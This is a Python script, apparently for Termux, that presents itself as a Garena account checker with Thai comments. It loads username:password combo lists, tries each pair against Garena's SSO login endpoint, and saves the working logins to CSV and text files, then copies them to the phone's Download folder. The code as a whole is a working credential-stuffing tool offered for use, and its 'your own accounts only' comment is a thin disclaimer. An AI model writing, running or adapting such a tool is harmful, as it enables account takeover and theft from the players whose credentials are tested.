# LiteBot.py — Garena Account Checker (Termux/Server friendly, auto-copy results)
# ใช้เฉพาะ "บัญชีของคุณเอง"
import httpx, asyncio, time, csv, os, shutil
from pathlib import Path
from typing import List, Tuple
from tqdm.asyncio import tqdm_asyncio

LOGIN_URL = "https://sso.garena.com/universal/api/login"

RESULTS_DIR = Path("results"); RESULTS_DIR.mkdir(exist_ok=True, parents=True)
WORKING_CSV = RESULTS_DIR / "working.csv"
FAILED_CSV  = RESULTS_DIR / "failed.csv"
VALID_TXT   = RESULTS_DIR / "valid_accounts.txt"
LOG_FILE    = Path("logs/log.txt")

def log(msg: str):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    Path("logs").mkdir(exist_ok=True, parents=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def ask_for_file() -> str:
    print("=== พิมพ์ชื่อไฟล์ .txt (เช่น accounts.txt) หรือวาง path เต็ม ===")
    return input("ไฟล์: ").strip().strip('"').strip("'")

def read_credentials(path: str) -> List[Tuple[str, str]]:
    creds=[]
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            s=line.strip()
            if not s or ":" not in s: continue
            u,p=s.split(":",1)
            creds.append((u.strip(), p.strip()))
    return creds

async def check_account(client: httpx.AsyncClient, username: str, password: str):
    try:
        payload={"username": username, "password": password}
        r = await client.post(LOGIN_URL, json=payload, timeout=15)
        if r.status_code == 200 and "error" not in r.text.lower():
            return True, "ok"
        return False, "invalid"
    except Exception as e:
        return False, f"error:{e}"

async def main():
    creds_path = ask_for_file()
    if not os.path.exists(creds_path):
        log(f"ไม่พบไฟล์: {creds_path}")
        return
    creds = read_credentials(creds_path)
    log(f"โหลดบัญชี {len(creds)} ไอดี")

    results=[]
    async with httpx.AsyncClient() as client:
        for u,p in tqdm_asyncio(creds, desc="Checking", unit="acc"):
            ok,reason = await check_account(client,u,p)
            results.append((u,p,ok,reason))

    ok_count=0; fail_count=0; valid_lines=[]
    with open(WORKING_CSV,"w",newline="",encoding="utf-8") as wf, \
         open(FAILED_CSV,"w",newline="",encoding="utf-8") as ff:
        w_ok=csv.writer(wf); w_fail=csv.writer(ff)
        w_ok.writerow(["username","password","status"])
        w_fail.writerow(["username","reason"])
        for u,p,ok,reason in results:
            if ok:
                w_ok.writerow([u,p,reason]); valid_lines.append(f"{u}:{p}"); ok_count+=1
            else:
                w_fail.writerow([u,reason]); fail_count+=1

    # เขียน valid_accounts.txt
    with open(VALID_TXT,"w",encoding="utf-8") as vf:
        vf.write("\n".join(valid_lines))

    # ✅ Auto-copy ไปโฟลเดอร์ Download
    download_dir = Path("/storage/emulated/0/Download")
    if download_dir.exists():
        for f in [WORKING_CSV, FAILED_CSV, VALID_TXT]:
            try:
                shutil.copy(f, download_dir / f.name)
                log(f"copied {f.name} → Download/")
            except Exception as e:
                log(f"copy {f.name} failed: {e}")

    log(f"SUMMARY ok={ok_count} fail={fail_count} total={len(results)}")
    log("done.")

if __name__=="__main__":
    asyncio.run(main())
